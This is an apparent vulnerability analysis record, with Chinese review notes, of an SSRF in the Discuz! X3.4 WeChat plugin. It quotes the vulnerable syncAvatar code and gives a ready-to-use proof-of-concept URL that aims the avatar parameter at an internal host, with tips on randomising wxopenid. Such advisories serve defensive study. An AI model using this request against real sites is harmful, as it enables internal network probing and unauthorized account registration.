---
source: "hatch 补库批 20260928"
product: "Discuz X3.4 WeChat plugin"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz! X3.4 Weixin Plugin ssrf"
prerequisites: "来源所述条件，未列明部分仍待核：WeChat login and wechat_allowregister enabled; unique wxopenid; registration produces uid; avatar URL fetch"
side_effects: "未执行；本文需注意的操作影响：Resulting user registration is external side effect of request, should be documented"
source_status: "unknown"
id: "vw-0a77e93a3d9bdaeecc804ecc"
entity_id: "ve-0a77e93a3d9bdaeecc804ecc"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：WeChat login and wechat_allowregister enabled; unique wxopenid; registration produces uid; avatar URL fetch

- **结论使用边界（1）**：Auth/config and unique-ID prerequisites usefully explicit。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：No broad version boundary/fix/source citation; output callback only screenshot。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **操作与副作用边界（3）**：Resulting user registration is external side effect of request, should be documented。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz! X3.4 Weixin Plugin ssrf

一、漏洞简介
------------

二、漏洞影响
------------

Discuz! X3.4

三、复现过程
------------

`source/plugin/wechat/wechat.class.php` `WeChat`类`syncAvatar`方法：

        static public function syncAvatar($uid, $avatar) {

            if(!$uid || !$avatar) {
                return false;
            }

            if(!$content = dfsockopen($avatar)) {
                return false;
            }

            $tmpFile = DISCUZ_ROOT.'./data/avatar/'.TIMESTAMP.random(6);
            file_put_contents($tmpFile, $content);

            if(!is_file($tmpFile)) {
                return false;
            }

            $result = uploadUcAvatar::upload($uid, $tmpFile);
            unlink($tmpFile);

            C::t('common_member')->update($uid, array('avatarstatus'=>'1'));

            return $result;
        }

`source/plugin/wechat/wechat.inc.php`
中调用了`WeChat::syncAvatar`，直接用`$_GET['avatar']`作为参数传进去：

    ......

    elseif(($ac == 'register' && submitcheck('submit') || $ac == 'wxregister') && $_G['wechat']['setting']['wechat_allowregister']) {

            ......

            $uid = WeChat::register($_GET['username'], $ac == 'wxregister');

            if($uid && $_GET['avatar']) {
                WeChat::syncAvatar($uid, $_GET['avatar']);
            }

    }

不过因为这里用到了微信登录的插件，所以要利用的话需要目标站开启微信登录：

![](./.resource/Discuz!X3.4WeixinPluginssrf/media/rId24.png)

这里 SSRF 的构造很简单，直接在`avatar`参数构造 url
即可（只是注意`wxopenid`参数每次请求都要足够随机保证没有重复，如果重复的话代码是无法走到发起请求的逻辑的）：

### poc

    http://target/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=http://localhost:9090/dz-weixin-plugin-ssrf&wxopenid=dont_be_evil

![](./.resource/Discuz!X3.4WeixinPluginssrf/media/rId26.png)
